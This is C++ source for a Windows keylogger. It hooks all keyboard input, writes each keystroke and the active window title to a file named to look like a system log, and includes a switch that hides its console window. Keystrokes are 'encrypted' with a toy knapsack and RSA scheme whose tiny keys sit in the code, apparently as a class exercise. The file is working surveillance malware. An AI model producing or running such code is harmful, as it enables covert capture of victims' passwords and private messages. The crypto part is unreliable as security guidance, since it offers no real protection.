#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include<stdio.h>
#include<string.h>
#include<stdlib.h>

#define visible 

HHOOK _hook;

KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke, char *file);

extern char lastwindow[256];

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			Save(kbdStruct.vkCode, "System32Log.txt");
		}
	}
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke, char *file)
{
    char lastwindow[256];
    
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; 
	
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");
		
	
	HWND foreground = GetForegroundWindow();
    if (foreground)
    {
        char window_title[256];
        GetWindowText(foreground, window_title, 256);
        
        if(strcmp(window_title, lastwindow)!=0) {
            strcpy(lastwindow, window_title);
            
            // get time
            time_t t = time(NULL);
            struct tm *tm = localtime(&t);
            char s[64];
            strftime(s, sizeof(s), "%c", tm);
            
            fprintf(OUTPUT_FILE, "\n\n[Window: %s - at %s] ", window_title, s);
        }
    }


//	std::cout << key_stroke << '\n';

	if (key_stroke == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key_stroke == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "\n");
	else if (key_stroke == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s", "[SPACE]");
	else if (key_stroke == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else if (key_stroke == 189 || key_stroke == 109)
		fprintf(OUTPUT_FILE, "%s", "-");
	else if (key_stroke == 20)
		fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
	else {
		if (key_stroke >= 96 && key_stroke <= 105)
		{
			key_stroke -= 48;
			}
		else if (key_stroke >= 65 && key_stroke <= 90) { // A-Z
													// check caps lock
			bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

			// check shift key
			if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 || (GetKeyState(VK_LSHIFT) & 0x0001) != 0 || (GetKeyState(VK_RSHIFT) & 0x0001) != 0) {
				lowercase = !lowercase;
			}

			if (lowercase) key_stroke += 32;
		}
		//crypto code 
			int no,i=0;
			no=8;
			int w[no],temp=0,sumofw,q,flag=0,gcd,r,pk;
			w[0]=2;
			w[1]=7;
			w[2]=11;
			w[3]=21;
			w[4]=42;
			w[5]=89;
			w[6]=180;
			w[7]=354;
			temp=0;
			q=881;
			r=588;
			int b[no];
			for(i=0;i<no;i++)
			{
			b[i]=(w[i]*r)%q;
			}
			int n,d,e,p1,p2,gcd1,gcd2;
			p1=53;
			p2=31;
			n=p1*p2;
			e=7;
			d=223;
			//Encryption
			int plaintxt[8],pltxt;
			temp=0;
			int c, k;
			int t=0;
			pltxt=key_stroke;
			int txtsize=8;
			 
			  for (c = 7; c >= 0; c--)
			  {
			    k = pltxt >> c;
			 
			    if (k & 1)
			      plaintxt[t]=1;
			    else
			      plaintxt[t]=0;
			  	t++;	
			  }
			
			printf("\nThe Plain text: ");
			for(i=0;i<txtsize;i++)
			{
			printf("%d ",plaintxt[i]);
			}
			for(i=0;i<txtsize;i++)
			{
			temp=temp+(plaintxt[i]*b[i]);
			}
			int ciphertxt = 1;
			temp = temp % n;
			int ee=e;
			while (e > 0)
			{
			if (e & 1)
			ciphertxt = (ciphertxt*temp) % n;
			e = e>>1;
			temp = (temp*temp) % n;
			}
			printf("\nCipher Text(%d^%d Mod %d) :%d",temp,ee,n,ciphertxt);
			
			//crypto code ends here 
		fprintf(OUTPUT_FILE, "%d",ciphertxt);
		fprintf(OUTPUT_FILE, "%s"," ");
    }

	fclose(OUTPUT_FILE);
	return 0;
}

void Stealth()
{
	#ifdef visible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
	#endif // visible

	#ifdef invisible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
	#endif // invisible
}

int main()
{
	Stealth();

	SetHook();

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
}
